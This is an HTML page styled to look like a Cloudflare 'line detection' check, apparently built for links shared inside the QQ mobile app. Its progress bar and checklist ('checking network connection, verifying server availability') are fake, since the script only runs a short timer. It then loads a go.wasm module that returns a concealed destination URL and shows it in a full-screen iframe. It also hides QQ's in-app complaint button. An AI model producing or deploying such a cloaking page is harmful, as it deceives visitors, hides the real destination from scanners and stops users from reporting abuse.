<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>线路检测中</title>
<script src="https://open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>
<script type="text/javascript">
    mqq.ui.setTitleButtons({
        right:{
            title:'投诉',
            hidden:true
        }
    })
</script>
<style>
:root {
    --cf-blue: #f38020;
    --cf-green: #10b981;
    --cf-gray-light: #f6f6f6;
    --cf-gray: #e0e0e0;
    --cf-text: #333;
    --cf-border: #ddd;
    --cf-font: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
}

* { 
    margin: 0; 
    padding: 0; 
    box-sizing: border-box; 
}

body {
    font-family: var(--cf-font);
    background: #fff;
    height: 100vh;
    width: 100%;
    margin: 0;
    padding: 0;
    overflow: hidden;
    position: relative;
}

/* 线路检测页面样式 */
#detectionPage {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: #fff;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 10000;
    transition: opacity 0.3s ease;
}

/* Cloudflare Header */
.cf-header {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    padding: 18px 28px;
    background: #fff;
    border-bottom: 1px solid var(--cf-border);
    font-size: 20px;
    font-weight: 600;
    color: var(--cf-blue);
    text-align: center;
}

/* 检测主容器 */
.cf-detection-box {
    background: #fff;
    width: 90%;
    max-width: 400px;
    padding: 40px 28px;
    text-align: center;
    border-radius: 12px;
}

/* 绿色检测标题 */
.cf-title { 
    font-size: 22px; 
    font-weight: 600; 
    margin-bottom: 15px; 
    color: var(--cf-green);
}

.cf-sub { 
    font-size: 15px; 
    color: #666; 
    margin-bottom: 30px;
    line-height: 1.5;
}

/* 绿色进度条 */
.cf-progress {
    width: 100%;
    height: 6px;
    background: var(--cf-gray);
    border-radius: 4px;
    overflow: hidden;
    margin: 30px 0 20px;
}

.cf-progress-bar {
    width: 0%;
    height: 100%;
    background: linear-gradient(90deg, var(--cf-green) 0%, #34d399 100%);
    border-radius: 4px;
    transition: width 0.3s ease;
}

/* 加载动画 */
.green-loader {
    width: 50px;
    height: 50px;
    margin: 0 auto 25px;
    position: relative;
}

.green-spinner {
    width: 100%;
    height: 100%;
    border: 4px solid rgba(16, 185, 129, 0.1);
    border-top-color: var(--cf-green);
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

/* 状态信息 */
.status-info {
    margin-top: 25px;
    padding: 15px;
    background: #f0fdf4;
    border-radius: 8px;
    border: 1px solid #bbf7d0;
}

.status-text {
    font-size: 14px;
    color: #065f46;
    line-height: 1.5;
}

.status-text strong {
    color: var(--cf-green);
}

/* Fullscreen iframe */
#mainFrame {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    border: none;
    z-index: 9999;
    display: none;
    background: white;
}

/* 倒计时显示 */
.countdown {
    font-size: 14px;
    color: #666;
    margin-top: 15px;
}

.countdown-number {
    font-weight: bold;
    color: var(--cf-green);
    margin: 0 3px;
}

/* Footer */
.cf-footer {
    position: absolute;
    bottom: 0;
    width: 100%;
    text-align: center;
    font-size: 12px;
    color: #666;
    background: #fff;
    padding: 10px 0;
    border-top: 1px solid var(--cf-border);
}

/* 响应式调整 */
@media (max-width: 480px) {
    .cf-header {
        padding: 15px 20px;
        font-size: 18px;
    }
    
    .cf-detection-box {
        width: 95%;
        padding: 35px 22px;
    }
    
    .cf-title {
        font-size: 20px;
    }
    
    .cf-sub {
        font-size: 14px;
    }
    
    .status-info {
        padding: 12px;
    }
}

/* 淡出动画 */
.fade-out {
    opacity: 0;
    pointer-events: none;
}
</style>
</head>

<body>
<!-- 线路检测页面 -->
<div id="detectionPage">
    
    <div class="cf-detection-box">
        <!-- 绿色加载动画 -->
        <div class="green-loader">
            <div class="green-spinner"></div>
        </div>
        
        <!-- 绿色标题 -->
        <div class="cf-title">正在检测线路，请稍后...</div>
        
        <!-- 绿色进度条 -->
        <div class="cf-progress">
            <div class="cf-progress-bar" id="progressBar"></div>
        </div>
        
        <!-- 倒计时显示 -->
        <div class="countdown" id="countdown">
            预计等待时间: <span class="countdown-number" id="countdownNumber">3</span> 秒
        </div>
        
        <!-- 状态信息 -->
        <div class="status-info">
            <div class="status-text">
                <strong>✓ 正在执行检测:</strong><br>
                • 检查网络连接状态<br>
                • 验证服务器可用性<br>
                • 优化访问线路
            </div>
        </div>
    </div>
    
</div>

<!-- 主页面iframe -->
<iframe id="mainFrame" scrolling="yes" frameborder="0"></iframe>

<script src="wasm_exec.js"></script>
<script>
document.addEventListener("DOMContentLoaded", function () {
    const detectionPage = document.getElementById('detectionPage');
    const mainFrame = document.getElementById('mainFrame');
    const progressBar = document.getElementById('progressBar');
    const countdownNumber = document.getElementById('countdownNumber');
    
    // 检测时间控制（2-3秒）
    const detectionTime = 2000 + Math.random() * 1000; // 2-3秒随机
    let progress = 0;
    let countdown = 3;
    let elapsedTime = 0;
    const startTime = Date.now();
    
    // 更新倒计时
    const countdownInterval = setInterval(() => {
        if (countdown > 0) {
            countdown--;
            countdownNumber.textContent = countdown;
        }
    }, 1000);
    
    // 模拟线路检测进度
    function updateDetectionProgress() {
        elapsedTime = Date.now() - startTime;
        progress = Math.min((elapsedTime / detectionTime) * 100, 100);
        progressBar.style.width = progress + "%";
        
        // 更新倒计时数字
        const remainingTime = Math.max(0, Math.ceil((detectionTime - elapsedTime) / 1000));
        if (remainingTime < countdown) {
            countdown = remainingTime;
            countdownNumber.textContent = remainingTime;
        }
        
        if (progress >= 100) {
            clearInterval(countdownInterval);
            
            // 检测完成，等待WASM执行
            setTimeout(() => {
                // 开始执行WASM
                startWASM();
                
                // 淡出检测页面
                detectionPage.classList.add('fade-out');
                
                setTimeout(() => {
                    detectionPage.style.display = 'none';
                    mainFrame.style.display = 'block';
                }, 300);
            }, 500);
        } else {
            setTimeout(updateDetectionProgress, 50);
        }
    }
    
    // WASM执行函数
    function startWASM() {
        if (typeof Go === 'undefined') {
            console.error('WASM Go runtime not loaded');
            return;
        }
        
        try {
            const go = new Go();
            
            // 设置WASM返回URL的回调
            window.onWASMComplete = function(url) {
                console.log('WASM返回的URL:', url);
                if (url && typeof url === 'string') {
                    mainFrame.src = url;
                }
            };
            
            // 加载并执行WASM
            WebAssembly.instantiateStreaming(fetch("go.wasm"), go.importObject)
                .then((result) => {
                    go.run(result.instance);
                })
                .catch(err => {
                    console.error('WASM加载失败:', err);
                    // 如果WASM失败，使用默认URL
                    mainFrame.src = "https://www.cloudflare.com";
                });
        } catch (error) {
            console.error('WASM执行错误:', error);
            mainFrame.src = "https://www.cloudflare.com";
        }
    }
    
    // 开始检测
    setTimeout(updateDetectionProgress, 100);
});
</script>
</body>
</html>
